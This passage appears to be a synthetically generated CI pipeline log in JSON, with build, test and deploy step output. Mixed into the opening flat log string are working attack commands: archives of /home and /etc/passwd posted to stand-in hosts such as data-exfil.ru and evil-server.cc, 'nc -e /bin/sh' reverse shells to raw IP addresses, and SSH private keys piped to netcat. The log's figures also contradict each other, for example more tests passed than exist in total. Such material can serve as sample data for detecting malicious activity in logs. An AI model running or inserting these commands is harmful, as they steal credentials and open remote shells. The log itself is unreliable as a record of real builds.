uploaded: build.tar.gz (32MB)\n[12:46:06] DEBUG: Memory usage: 214MB\n[12:46:06] DEBUG: Loading configuration\nnpm notice: package.json updated\nCompiling lib/handler.rs...\npip: Downloading webpack-2.0.tar.gz\nTLS handshake completed\nHEAD is now at 53fa360\nDone.\nFetching from https://gcr.io/package.json\n=== Step integration_tests completed ===\nSending 319MB of data to malicious-pool.xyz\n=== Step: restore_cache ===\nTLS handshake completed\nRan 81 tests in 57s\nFAILED: test_cache_hit\npip: Collecting webpack\npip install: Successfully installed eslint-5.0\nPlatform: linux-x64\nStep 19/20: Linting\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\n[12:46:06] INFO: Starting build process\nWARNING: lodash has known vulnerabilities\npip: Downloading prettier-3.0.tar.gz\nLoading...\nCreating production build...\nGenerating source maps...\nStep 12/23: Testing\nOptimizing 66 modules...\nCompleted.\nUsing Python 3.10\nStep 15/21: Building\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nImage pulled successfully\nCache restored successfully (442MB)\nCompiling src/main.py...\nConnection established\nCompiling components/index.js...\n\u2713 All checks passed\nTest Suites: 29 passed, 39 total\nStep 16/20: Linting\n[12:46:06] DEBUG: Query executed in 87ms\nStep 12/21: Deploying\nStep 16/23: Building\nCompiling utils/app.ts...\nFinished.\nBundling main.css\nLoading...\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\nWARNING: axios has known vulnerabilities\nSnapshots: 6 passed, 36 total\nArtifact uploaded: dist.zip (10MB)\n[12:46:06] INFO: Starting build process\nnpm install: resolved 1750 packages\nNODE_ENV=test\nnc -e /bin/sh 39.115.119.132 13974\nStep 12/19: Installing dependencies\n[12:46:06] DEBUG: Connection pool: 3 active\n[12:46:06] WARN: Deprecated API usage\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: build.tar.gz (34MB)\n[12:46:06] INFO: Request completed\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\nInstalling axios@3.0.3\nCache restored successfully (196MB)\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\necho $(cat ~/.ssh/id_rsa) | base64 | nc 85.69.190.171 64062\n[12:46:06] DEBUG: Loading configuration\nHEAD is now at d6cf9b7\npip: Collecting axios\nnpm notice: package.json updated\nLoading...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 253.127.73.118 56805\nTransforming 222 files...\npip install: Successfully installed react-2.17\nLoading...\nStep 9/16: Building\n\u2717 build failed with exit code 55\nCompiling lib/service.java...\nArtifact uploaded: build.tar.gz (45MB)\n  PASS: integration/test_db_connect.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: express has known vulnerabilities\nRan 92 tests in 9s\nCompiling utils/handler.rs...\nSending 212MB of data to malicious-pool.xyz\nFetching submodules...\nStep 7/15: Deploying\nLoading...\nReady.\nTransforming 101 files...\nStep 13/24: Installing dependencies\nyarn add: Done in 18.86s\n[12:46:06] WARN: Deprecated API usage\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\nAlready up to date.\nyarn add: Done in 16.93s\n[12:46:06] DEBUG: Memory usage: 623MB\nnc -e /bin/sh 254.62.132.177 56916\nUsing Python 3.9\npip: Collecting express\nSnapshots: 3 passed, 5 total\nPlatform: linux-x64\npip install: Successfully installed express-3.8\nReady.\nSwitched to branch 'feature/task-884'\n  PASS: test_api_health (378ms)\nProcessing...\n\u2713 Step 'test' succeeded\n\u2713 Step 'install' succeeded\npip: Collecting react\nException: NullPointerException\n[12:46:06] ERROR: Connection failed\nUsing Node.js 18.4.1\nnc -e /bin/sh 112.220.172.78 55619\nWaiting...\nnpm notice: created a lockfile\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTests: 272 passed, 121 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:06] DEBUG: Memory usage: 677MB\nCompiling lib/index.js...\nGenerating source maps...\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\nnpm notice: package.json updated\nyarn add: Done in 8.35s\nStep 20/23: Running migrations\nCache invalidated: node_modules\nnc -e /bin/sh 239.212.202.17 21063\npip: Installing build dependencies...\nCompiling components/handler.rs...\nBuilding Docker image...\n\u2717 build failed with exit code 93\nHEAD is now at 77366c5\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nLoading...\nStep 8/20: Installing dependencies\nLayer 1/9: ENV command\n[12:46:06] DEBUG: Initializing service\nnpm install: resolved 820 packages\nCompiling lib/app.ts...\nnc -e /bin/sh 44.205.176.133 6571\nCache hit for key-6910\nPulling image: python:latest\n[12:46:06] WARN: Deprecated API usage\nFetching submodules...\nStep 16/23: Testing\nnpm install: resolved 1546 packages\nnc -e /bin/sh 106.176.112.156 33202\nCompiling utils/index.js...\nyarn add: Done in 15.64s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: dist.zip (39MB)\n[12:46:06] INFO: Connecting to database\nTests: 315 passed, 457 total\nChecking out master branch\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\nFinished.\nHEAD is now at e68e462\nRan 186 tests in 29s\nnpm install: added 56 packages\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSuccess!\nCache hit for key-1657\nSending 80MB of data to evil-server.cc\nHEAD is now at 00e5605\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\nStep 5/24: Building\nnpm install: added 118 packages\nnpm notice: package.json updated\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\nMinifying main.js\nStep 17/24: Building\n  PASS: test_user_create (238ms)\nStep 19/20: Installing dependencies\nReady.\nPulling image: python:latest\nException: TypeError\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nLoading...\npip: Collecting react\nSwitched to branch 'feature/task-750'\nWaiting...\nStep 4/16: Installing dependencies\nPlatform: linux-x64\nWARNING: axios has known vulnerabilities\nFetching submodules...\nCache invalidated: build\necho $(cat ~/.ssh/id_rsa) | base64 | nc 188.169.230.59 63602\nCoverage: 86% statements, 70% branches\nPOST /api - 200 (198ms)\nHEAD is now at 9612a8d\nTLS handshake completed\n=== Step restore_cache completed ===",
    "steps": [
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-04T12:46:06.727371",
        "finished_at": "2025-12-04T12:46:21.776174",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Step 9/20: Linting",
          "Image pulled successfully",
          "[12:46:06] INFO: Connecting to database",
          "Generating source maps...",
          "Step 20/15: Testing",
          "Connection established",
          "[12:46:06] INFO: Cache refreshed",
          "Generating source maps...",
          "POST /api - 200 (442ms)",
          "  PASS: test_user_create (86ms)",
          "[12:46:06] INFO: Starting build process",
          "Cache invalidated: dependencies",
          "Artifact downloaded: 19MB",
          "TLS handshake completed",
          "Compiling components/index.js...",
          "Installing webpack@3.15.5",
          "Completed.",
          "Environment: production",
          "Ran 35 tests in 18s",
          "Step 5/18: Linting",
          "Step 12/23: Running migrations",
          "GET /status - 204 (56ms)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "[12:46:06] DEBUG: Query executed in 90ms",
          "Building Docker image...",
          "pip: Collecting jest",
          "[12:46:06] DEBUG: Initializing service",
          "npm notice: package.json updated",
          "[12:46:06] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Creating production build...",
          "[12:46:06] INFO: Starting build process",
          "[12:46:06] DEBUG: Initializing service",
          "Artifact uploaded: build.tar.gz (12MB)",
          "npm install: added 463 packages",
          "Cache miss for key-1784",
          "pip: Collecting prettier",
          "Artifact uploaded: build.tar.gz (42MB)",
          "\u2713 All checks passed",
          "npm install: resolved 277 packages",
          "  PASS: integration/test_user_create.spec.js",
          "[12:46:06] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling utils/handler.rs...",
          "Creating production build...",
          "Coverage: 78% statements, 68% branches",
          "Using Python 3.11",
          "OK",
          "Cache miss for key-8453",
          "Cache saved successfully",
          "Using Node.js 16.20.1",
          "Pulling image: python:latest",
          "[12:46:06] INFO: Starting build process",
          "Step 10/22: Testing",
          "Step 16/20: Testing",
          "Artifact uploaded: dist.zip (63MB)",
          "pip: Collecting webpack",
          "Transforming 684 files...",
          "Creating production build...",
          "[12:46:06] DEBUG: Initializing service",
          "npm install: added 459 packages",
          "Step 10/19: Building",
          "Using Node.js 16.7.5",
          "Coverage: 75% statements, 82% branches",
          "Platform: linux-x64",
          "npm notice: package.json updated",
          "[12:46:06] INFO: Connecting to database",
          "NODE_ENV=production",
          "Step 19/21: Deploying",
          "Artifact uploaded: dist.zip (69MB)",
          "POST /data - 200 (493ms)",
          "NODE_ENV=production",
          "Step 9/20: Linting",
          "Creating production build...",
          "Checking out main branch",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Fetching submodules...",
          "WARNING: prettier has known vulnerabilities",
          "Using Python 3.11",
          "npm install: resolved 1663 packages",
          "Pushing to registry...",
          "Uploading artifact 'dist' (30 files)",
          "[12:46:06] DEBUG: Loading configuration",
          "Finished.",
          "Compiling src/app.ts...",
          "Compiling lib/main.py...",
          "[12:46:06] DEBUG: Connection pool: 16 active",
          "Step 2/15: Installing dependencies",
          "Fetching from https://registry.npmjs.org/package.json",
          "Coverage: 95% statements, 94% branches",
          "npm notice: created a lockfile",
          "Pulling image: alpine:18",
          "Uploading artifact 'build' (38 files)",
          "Finished.",
          "Cache saved successfully",
          "FAILED: test_api_health",
          "npm install: resolved 160 packages",
          "[12:46:06] INFO: Cache refreshed",
          "Cache restored successfully (447MB)",
          "Using Node.js 19.2.9",
          "Cache restored successfully (189MB)",
          "Success!",
          "Cache restored successfully (247MB)",
          "Switched to branch 'feature/task-646'",
          "WARNING: webpack has known vulnerabilities",
          "Step 15/23: Linting",
          "POST /upload - 200 (347ms)",
          "[12:46:06] WARN: Deprecated API usage",
          "Artifact downloaded: 33MB",
          "Switched to branch 'hotfix/task-668'",
          "Done.",
          "Done.",
          "WARNING: webpack has known vulnerabilities",
          "Fetching from https://gcr.io/package.json",
          "Using Python 3.9",
          "Already up to date.",
          "WARNING: jest has known vulnerabilities",
          "Success!",
          "Finished.",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 All checks passed",
          "Platform: linux-x64",
          "  PASS: integration/test_cache_hit.spec.js",
          "Verifying...",
          "POST /upload - 202 (248ms)",
          "Uploading artifact 'build' (22 files)",
          "[12:46:06] WARN: Deprecated API usage",
          "Test Suites: 26 passed, 34 total",
          "[12:46:06] DEBUG: Loading configuration",
          "Cache restored successfully (345MB)",
          "[12:46:06] INFO: Processing request",
          "TLS handshake completed",
          "\u2713 All checks passed",
          "Using Node.js 19.1.9",
          "[12:46:06] WARN: Deprecated API usage",
          "\u2713 Step 'build' succeeded",
          "Cache miss for key-8689",
          "[12:46:06] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (44MB)",
          "\u2717 build failed with exit code 1",
          "Layer 3/15: COPY command",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Waiting...",
          "  PASS: unit/test_auth_login.spec.js",
          "Cache invalidated: dependencies",
          "Done.",
          "Finished.",
          "Success!",
          "Tests: 486 passed, 302 total",
          "Compiling components/app.ts...",
          "[12:46:06] WARN: Deprecated API usage",
          "Snapshots: 27 passed, 1 total",
          "WARNING: react has known vulnerabilities",
          "Switched to branch 'bugfix/task-105'",
          "[12:46:06] INFO: Cache refreshed",
          "Done.",
          "Compiling lib/utils.go...",
          "[12:46:06] DEBUG: Connection pool: 12 active",
          "\u2713 Task completed in 4976ms",
          "Time: 2.943s",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-04T12:46:21.776174",
        "finished_at": "2025-12-04T12:46:36.824977",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Step 19/21: Building",
          "[12:46:06] DEBUG: Memory usage: 624MB",
          "pip: Collecting eslint",
          "Ran 107 tests in 20s",
          "Ready.",
          "[12:46:06] INFO: Processing request",
          "Cache restored successfully (419MB)",
          "Step 19/15: Testing",
          "Coverage: 93% statements, 97% branches",
          "Verifying...",
          "Transforming 561 files...",
          "WARNING: axios has known vulnerabilities",
          "[12:46:06] DEBUG: Loading configuration",
          "Fetching from https://githubusercontent.com/package.json",
          "Image pulled successfully",
          "Tests: 389 passed, 223 total",
          "Done.",
          "pip: Downloading jest-3.9.tar.gz",
          "[12:46:06] WARN: Deprecated API usage",
          "Snapshots: 42 passed, 31 total",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Creating production build...",
          "Compiling utils/utils.go...",
          "Done.",
          "WARNING: express has known vulnerabilities",
          "Cache restored successfully (247MB)",
          "Processing...",
          "  PASS: test_api_health (289ms)",
          "Checking out master branch",
          "npm install: added 284 packages",
          "Generating source maps...",
          "HEAD is now at f263655",
          "Fetching submodules...",
          "[12:46:06] DEBUG: Connection pool: 14 active",
          "Coverage: 91% statements, 100% branches",
          "Transforming 114 files...",
          "Bundling vendor.js",
          "Ready.",
          "Step 9/16: Building",
          "Cache invalidated: dependencies",
          "GET /health - 200 (94ms)",
          "Loading...",
          "npm notice: created a lockfile",
          "pip: Collecting prettier",
          "Success!",
          "Cache invalidated: node_modules",
          "Test Suites: 43 passed, 50 total",
          "Artifact downloaded: 22MB",
          "Installing jest@4.15.4",
          "Switched to branch 'hotfix/task-284'",
          "pip install: Successfully installed prettier-3.4",
          "[12:46:06] DEBUG: Query executed in 84ms",
          "Platform: linux-x64",
          "TLS handshake completed",
          "npm install: added 89 packages",
          "Snapshots: 14 passed, 15 total",
          "Cache invalidated: build",
          "\u2713 Step 'build' succeeded",
          "WARNING: react has known vulnerabilities",
          "Switched to branch 'bugfix/task-672'",
          "Cache restored successfully (156MB)",
          "Processing...",
          "Verifying...",
          "[12:46:06] INFO: Processing request",
          "Generating source maps...",
          "Step 7/21: Running migrations",
          "Layer 5/15: ENV command",
          "[12:46:06] ERROR: Connection failed",
          "Fetching submodules...",
          "npm notice: package.json updated",
          "[12:46:06] DEBUG: Memory usage: 1884MB",
          "Done.",
          "WARNING: eslint has known vulnerabilities",
          "Step 5/21: Running migrations",
          "Artifact uploaded: dist.zip (61MB)",
          "Cache miss for key-3163",
          "Cache hit for key-3043",
          "Success!",
          "Using Node.js 18.1.0",
          "Already up to date.",
          "NODE_ENV=production",
          "Compiling src/service.java...",
          "Waiting...",
          "WARNING: jest has known vulnerabilities",
          "[12:46:06] INFO: Cache refreshed",
          "Cache saved successfully",
          "Platform: darwin-arm64",
          "Bundling styles.js",
          "npm install: resolved 1021 packages",
          "Environment: production",
          "Ran 122 tests in 15s",
          "Compiling lib/main.py...",
          "Loading...",
          "Verifying...",
          "Exception: NullPointerException",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Pushing to registry...",
          "Snapshots: 16 passed, 12 total",
          "\u2713 Step 'build' succeeded",
          "Verifying...",
          "\u2713 lint completed",
          "Loading...",
          "Creating production build...",
          "Creating production build...",
          "WARNING: eslint has known vulnerabilities",
          "npm install: resolved 483 packages",
          "\u2713 All checks passed",
          "Compiling src/utils.go...",
          "[12:46:06] WARN: Deprecated API usage",
          "Minifying main.js",
          "Pulling image: alpine:18",
          "Using Python 3.9",
          "\u2713 Task completed in 3244ms",
          "Ran 68 tests in 42s",
          "\u2713 Task completed in 2900ms",
          "Time: 39.264s",
          "Done.",
          "pip: Collecting eslint",
          "\u2717 build failed with exit code 83",
          "Environment: test",
          "Step 4/25: Building",
          "[12:46:06] INFO: Connecting to database",
          "Switched to branch 'bugfix/task-387'",
          "Step 16/15: Deploying",
          "Minifying main.js",
          "Bundling runtime.js",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm notice: package.json updated",
          "Step 7/15: Deploying",
          "[12:46:06] WARN: Deprecated API usage",
          "Uploading artifact 'dist' (8 files)",
          "FAILED: test_cache_hit",
          "[12:46:06] WARN: Deprecated API usage",
          "Step 17/16: Linting",
          "Compiling utils/handler.rs...",
          "pip: Downloading react-2.10.tar.gz",
          "Step 17/20: Linting",
          "pip: Downloading lodash-4.1.tar.gz",
          "WARNING: react has known vulnerabilities",
          "Done.",
          "pip: Collecting axios",
          "Test Suites: 27 passed, 38 total",
          "  PASS: integration/test_api_health.spec.js",
          "[12:46:06] WARN: Deprecated API usage",
          "TLS handshake completed",
          "GET /health - 204 (76ms)",
          "WARNING: react has known vulnerabilities",
          "Building Docker image...",
          "pip: Collecting axios",
          "[12:46:06] WARN: Deprecated API usage",
          "WARNING: axios has known vulnerabilities",
          "Using Python 3.12",
          "Step 15/16: Installing dependencies",
          "Ready.",
          "Creating production build...",
          "[12:46:06] INFO: Starting build process",
          "  PASS: test_api_health (471ms)",
          "Generating source maps...",
          "TLS handshake completed",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-04T12:46:36.824977",
        "finished_at": "2025-12-04T12:47:21.971386",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Installing prettier@5.12.10",
          "Cache hit for key-1586",
          "[12:46:06] DEBUG: Loading configuration",
          "Fetching submodules...",
          "Using Python 3.11",
          "[12:46:06] DEBUG: Memory usage: 1352MB",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Uploading artifact 'coverage' (21 files)",
          "Artifact uploaded: dist.zip (58MB)",
          "Already up to date.",
          "Environment: staging",
          "Installing lodash@5.16.7",
          "HEAD is now at 79bbbad",
          "[12:46:06] WARN: Deprecated API usage",
          "TLS handshake completed",
          "Done.",
          "[12:46:06] INFO: Processing request",
          "Compiling components/handler.rs...",
          "Environment: test",
          "pip: Collecting eslint",
          "Step 11/16: Running migrations",
          "  PASS: test_auth_login (32ms)",
          "Ready.",
          "Processing...",
          "[12:46:06] ERROR: Connection failed",
          "npm install: resolved 678 packages",
          "[12:46:06] DEBUG: Memory usage: 1492MB",
          "Building Docker image...",
          "Generating source maps...",
          "pip: Installing build dependencies...",
          "[12:46:06] DEBUG: Memory usage: 126MB",
          "Installing webpack@2.7.5",
          "npm install: added 310 packages",
          "Step 9/19: Testing",
          "\u2713 All checks passed",
          "Cache restored successfully (150MB)",
          "[12:46:06] INFO: Cache refreshed",
          "Success!",
          "Step 9/24: Installing dependencies",
          "Loading...",
          "pip install: Successfully installed express-1.12",
          "Step 1/22: Testing",
          "Fetching from https://githubusercontent.com/package.json",
          "Switched to branch 'bugfix/task-716'",
          "WARNING: prettier has known vulnerabilities",
          "Exception: TypeError",
          "[12:46:06] ERROR: Connection failed",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Verifying...",
          "\u2713 package completed",
          "Building Docker image...",
          "Ready.",
          "Artifact uploaded: build.tar.gz (21MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Already up to date.",
          "Cache hit for key-1331",
          "Environment: test",
          "Bundling styles.js",
          "Generating source maps...",
          "Compiling components/utils.go...",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:46:06] INFO: Starting build process",
          "Compiling components/index.js...",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Step 17/20: Linting",
          "pip: Downloading lodash-5.10.tar.gz",
          "POST /api - 200 (39ms)",
          "[12:46:06] INFO: Starting build process",
          "Installing webpack@1.14.7",
          "  PASS: test_db_connect (12ms)",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 19/22: Deploying",
          "GET /status - 200 (48ms)",
          "Platform: darwin-arm64",
          "Exception: RuntimeError",
          "Ran 183 tests in 44s",
          "\u2713 Task completed in 2167ms",
          "Image pulled successfully",
          "Step 9/21: Installing dependencies",
          "Time: 117.332s",
          "Bundling vendor.css",
          "  PASS: test_user_create (480ms)",
          "[12:46:06] DEBUG: Connection pool: 3 active",
          "Bundling runtime.css",
          "Platform: win32-x64",
          "[12:46:06] DEBUG: Memory usage: 1295MB",
          "pip: Collecting eslint",
          "Creating production build...",
          "[12:46:06] WARN: Deprecated API usage",
          "Compiling components/app.ts...",
          "WARNING: axios has known vulnerabilities",
          "npm install: resolved 545 packages",
          "Already up to date.",
          "npm notice: package.json updated",
          "[12:46:06] DEBUG: Loading configuration",
          "Cache hit for key-5320",
          "pip: Installing build dependencies...",
          "Cache saved successfully",
          "[12:46:06] WARN: Deprecated API usage",
          "Coverage: 76% statements, 98% branches",
          "[12:46:06] INFO: Starting build process",
          "[12:46:06] WARN: Deprecated API usage",
          "[12:46:06] ERROR: Connection failed",
          "Artifact uploaded: dist.zip (68MB)",
          "Finished.",
          "Artifact uploaded: dist.zip (42MB)",
          "TLS handshake completed",
          "Pulling image: node:3.11",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Finished.",
          "Cache miss for key-3905",
          "Artifact uploaded: build.tar.gz (2MB)",
          "pip: Downloading webpack-5.2.tar.gz",
          "Compiling components/main.py...",
          "Creating production build...",
          "Artifact uploaded: dist.zip (52MB)",
          "Waiting...",
          "\u2713 validate completed",
          "Tests: 494 passed, 96 total",
          "Step 3/25: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 2/17: Building",
          "  PASS: test_api_health (447ms)",
          "npm notice: package.json updated",
          "Tests: 376 passed, 498 total",
          "Step 2/21: Running migrations",
          "[12:46:06] ERROR: Connection failed",
          "Artifact uploaded: dist.zip (79MB)",
          "Step 8/16: Installing dependencies",
          "Compiling lib/utils.go...",
          "Coverage: 89% statements, 95% branches",
          "HEAD is now at c8688a2",
          "Processing...",
          "Tests: 328 passed, 446 total",
          "OK",
          "OK",
          "[12:46:06] DEBUG: Connection pool: 20 active",
          "Pulling image: python:3.11",
          "npm install: added 302 packages",
          "Already up to date.",
          "Cache invalidated: dependencies",
          "yarn add: Done in 29.70s",
          "[12:46:06] INFO: Cache refreshed",
          "Ready.",
          "POST /api - 201 (434ms)",
          "Compiling components/main.py...",
          "Already up to date.",
          "Compiling utils/index.js...",
          "WARNING: eslint has known vulnerabilities",
          "Waiting...",
          "Fetching submodules...",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Exception: TypeError",
          "WARNING: prettier has known vulnerabilities",
          "Image pulled successfully",
          "Compiling utils/utils.go...",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-04T12:47:21.971386",
        "finished_at": "2025-12-04T12:47:37.020189",
        "log_lines": [
          "=== Step: type_check ===",
          "Using Python 3.12",
          "Building Docker image...",
          "Bundling runtime.js",
          "Step 19/21: Testing",
          "Artifact downloaded: 7MB",
          "Uploading artifact 'dist' (43 files)",
          "Installing lodash@1.14.4",
          "Coverage: 76% statements, 85% branches",
          "[12:46:06] WARN: Deprecated API usage",
          "Environment: production",
          "Platform: linux-x64",
          "Cache miss for key-2435",
          "Step 13/17: Deploying",
          "WARNING: axios has known vulnerabilities",
          "Environment: test",
          "pip: Downloading lodash-4.8.tar.gz",
          "[12:46:06] DEBUG: Loading configuration",
          "TLS handshake completed",
          "  PASS: integration/test_auth_login.spec.js",
          "Exception: RuntimeError",
          "pip: Collecting prettier",
          "Checking out master branch",
          "Cache restored successfully (60MB)",
          "[12:46:06] WARN: Deprecated API usage",
          "Switched to branch 'feature/task-292'",
          "Cache hit for key-7579",
          "Verifying...",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Test Suites: 21 passed, 33 total",
          "Generating source maps...",
          "Cache restored successfully (453MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 7/24: Testing",
          "Generating source maps...",
          "POST /api - 202 (101ms)",
          "Time: 68.164s",
          "Ready.",
          "Uploading artifact 'coverage' (44 files)",
          "Loading...",
          "Step 5/23: Building",
          "NODE_ENV=production",
          "WARNING: react has known vulnerabilities",
          "Artifact downloaded: 39MB",
          "\u2713 All checks passed",
          "Using Python 3.12",
          "Switched to branch 'hotfix/task-749'",
          "\u2713 build completed",
          "Step 6/20: Testing",
          "Transforming 460 files...",
          "FAILED: test_api_health",
          "Transforming 569 files...",
          "Step 20/17: Linting",
          "[12:46:06] WARN: Deprecated API usage",
          "HEAD is now at c82f567",
          "\u2717 build failed with exit code 104",
          "pip: Downloading react-1.18.tar.gz",
          "Ran 43 tests in 30s",
          "[12:46:06] DEBUG: Loading configuration",
          "Step 18/25: Installing dependencies",
          "pip: Installing build dependencies...",
          "  PASS: e2e/test_db_connect.spec.js",
          "Already up to date.",
          "Cache hit for key-7340",
          "Environment: staging",
          "[12:46:06] INFO: Request completed",
          "[12:46:06] WARN: Deprecated API usage",
          "Layer 8/12: ENV command",
          "Connection established",
          "FAILED: test_auth_login",
          "Step 10/25: Linting",
          "[12:46:06] DEBUG: Connection pool: 13 active",
          "Test Suites: 41 passed, 25 total",
          "[12:46:06] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Using Python 3.11",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling lib/handler.rs...",
          "Generating source maps...",
          "[12:46:06] INFO: Cache refreshed",
          "Optimizing 83 modules...",
          "Compiling lib/app.ts...",
          "WARNING: express has known vulnerabilities",
          "[12:46:06] DEBUG: Query executed in 53ms",
          "[12:46:06] INFO: Connecting to database",
          "npm install: added 393 packages",
          "Fetching submodules...",
          "Step 18/21: Testing",
          "\u2713 lint completed",
          "Pushing to registry...",
          "Loading...",
          "Switched to branch 'bugfix/task-800'",
          "Using Node.js 18.4.5",
          "Verifying...",
          "pip: Collecting lodash",
          "[12:46:06] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Step 1/20: Testing",
          "Switched to branch 'hotfix/task-363'",
          "Generating source maps...",
          "POST /data - 202 (437ms)",
          "  PASS: e2e/test_cache_hit.spec.js",
          "[12:46:06] INFO: Cache refreshed",
          "Image pulled successfully",
          "[12:46:06] INFO: Starting build process",
          "Already up to date.",
          "[12:46:06] INFO: Cache refreshed",
          "Step 9/21: Deploying",
          "yarn add: Done in 12.76s",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Artifact downloaded: 36MB",
          "pip: Collecting lodash",
          "npm install: added 392 packages",
          "Cache saved successfully",
          "[12:46:06] WARN: Deprecated API usage",
          "Step 18/18: Testing",
          "Bundling vendor.js",
          "[12:46:06] ERROR: Connection failed",
          "Compiling components/main.py...",
          "POST /upload - 200 (306ms)",
          "Platform: win32-x64",
          "WARNING: axios has known vulnerabilities",
          "\u2713 package completed",
          "yarn add: Done in 23.63s",
          "Step 20/15: Building",
          "pip: Installing build dependencies...",
          "Test Suites: 9 passed, 23 total",
          "Fetching submodules...",
          "  PASS: test_db_connect (86ms)",
          "\u2713 Step 'checkout' succeeded",
          "[12:46:06] INFO: Cache refreshed",
          "[12:46:06] DEBUG: Query executed in 58ms",
          "Cache hit for key-7814",
          "Cache saved successfully",
          "[12:46:06] DEBUG: Memory usage: 410MB",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "TLS handshake completed",
          "Snapshots: 43 passed, 13 total",
          "pip: Downloading react-5.2.tar.gz",
          "Cache saved successfully",
          "[12:46:06] DEBUG: Connection pool: 15 active",
          "Ready.",
          "Completed.",
          "Verifying...",
          "Using Node.js 18.16.1",
          "Installing prettier@2.10.9",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:06] DEBUG: Query executed in 5ms",
          "GET /api - 200 (70ms)",
          "Coverage: 76% statements, 94% branches",
          "WARNING: eslint has known vulnerabilities",
          "Step 9/24: Installing dependencies",
          "[12:46:06] INFO: Connecting to database",
          "Cache miss for key-1531",
          "Tests: 134 passed, 417 total",
          "[12:46:06] INFO: Processing request",
          "Done.",
          "Step 1/18: Deploying",
          "Minifying vendor.js",
          "Coverage: 97% statements, 75% branches",
          "[12:46:06] INFO: Connecting to database",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-04T12:47:37.020189",
        "finished_at": "2025-12-04T12:47:43.039710",
        "log_lines": [
          "=== Step: checkout ===",
          "yarn add: Done in 6.28s",
          "Installing webpack@3.3.8",
          "Step 17/22: Linting",
          "Pushing to registry...",
          "Step 18/18: Running migrations",
          "Compiling src/utils.go...",
          "HEAD is now at 4c892e9",
          "Cache miss for key-4599",
          "Using Node.js 16.19.6",
          "Ready.",
          "Using Python 3.10",
          "Checking out main branch",
          "[12:46:06] INFO: Starting build process",
          "Tests: 423 passed, 194 total",
          "Test Suites: 45 passed, 42 total",
          "[12:46:06] INFO: Starting build process",
          "Completed.",
          "Fetching submodules...",
          "Minifying main.js",
          "POST /upload - 201 (370ms)",
          "Verifying...",
          "Compiling lib/main.py...",
          "Optimizing 28 modules...",
          "Optimizing 32 modules...",
          "Connection established",
          "npm install: resolved 1926 packages",
          "Checking out develop branch",
          "Cache restored successfully (323MB)",
          "[12:46:06] DEBUG: Memory usage: 213MB",
          "Tests: 141 passed, 359 total",
          "[12:46:06] INFO: Request completed",
          "[12:46:06] DEBUG: Initializing service",
          "Checking out master branch",
          "Layer 3/9: ENV command",
          "Verifying...",
          "[12:46:06] DEBUG: Loading configuration",
          "[12:46:06] INFO: Connecting to database",
          "Bundling runtime.css",
          "npm notice: package.json updated",
          "Exception: NullPointerException",
          "  PASS: e2e/test_auth_login.spec.js",
          "Tests: 210 passed, 360 total",
          "  PASS: unit/test_cache_hit.spec.js",
          "Processing...",
          "npm install: resolved 341 packages",
          "pip: Collecting jest",
          "Step 18/15: Building",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
